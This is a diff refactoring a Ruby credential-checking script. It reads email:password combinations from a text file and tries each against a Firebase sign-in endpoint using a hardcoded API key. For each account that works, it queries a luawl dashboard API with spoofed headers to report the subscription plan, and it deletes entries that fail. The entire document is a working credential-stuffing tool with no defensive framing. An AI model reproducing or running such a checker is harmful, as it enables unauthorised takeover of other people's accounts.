@@ -2,30 +2,28 @@ require 'net/http'
 require 'uri'
 require 'json'
 
-api_key = "AIzaSyCio3wiwvwX1bkk5lSNXMnT6maKMPkfgrQ"
+API_KEY = "AIzaSyCio3wiwvwX1bkk5lSNXMnT6maKMPkfgrQ"
 
 def get_token(uemail, upass, key)
-  uri = URI.parse("https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=" + key)
+  uri = URI("https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=" + key)
   request = Net::HTTP::Post.new(uri)
   request.content_type = "application/json"
-  request.body = JSON.dump({
-    "returnSecureToken" => true,
-    "email" => uemail,
-    "password" => upass,
-  })
-  req_options = {
-    use_ssl: uri.scheme == "https",
-  }
-  response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
+  request.body = {
+    returnSecureToken: true,
+    email: uemail,
+    password: upass,
+  }.to_json
+
+  response = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true) do |http|
     http.request(request)
   end
 
   json = JSON.parse(response.body)
-  return json["idToken"]
+  json["idToken"]
 end
 
 def get_plan(token)
-  uri = URI.parse("https://api2.luawl.com/validateLoginFB.php")
+  uri = URI("https://api2.luawl.com/validateLoginFB.php")
   request = Net::HTTP::Post.new(uri)
   request["Authorization"] = "Bearer " + token
   request["Origin"] = "https://dashboard.luawl.com"
@@ -35,16 +33,13 @@ def get_plan(token)
   request["Host"] = "api2.luawl.com"
   request["Content-Type"] = "application/json"
   request["Referer"] = "https://dashboard.luawl.com/"
-  req_options = {
-    use_ssl: uri.scheme == "https",
-  }
-  response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
+
+  response = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true) do |http|
     http.request(request)
   end
 
-    json = JSON.parse(response.body)
-    return json["data"][0]["plan_name"]
-
+  json = JSON.parse(response.body)
+  json["data"][0]["plan_name"]
 end
 
 def get_tokens_from_file(file, key)
@@ -52,7 +47,8 @@ def get_tokens_from_file(file, key)
     email, pass = line.split(":")
     token = get_token(email, pass, key)
     if token.nil?
-      File.write(file, File.readlines(file).reject { |l| l.include?(line) }.join)
+      lines = File.readlines(file).reject { |l| l.include?(line) }
+      File.write(file, lines.join)
     else
       plan = get_plan(token)
       puts "\e[32m" + line + "\e[0m" + " - " + plan
@@ -60,4 +56,4 @@ def get_tokens_from_file(file, key)
   end
 end
 
-get_tokens_from_file("pass.txt", api_key)
+get_tokens_from_file("pass.txt", API_KEY)
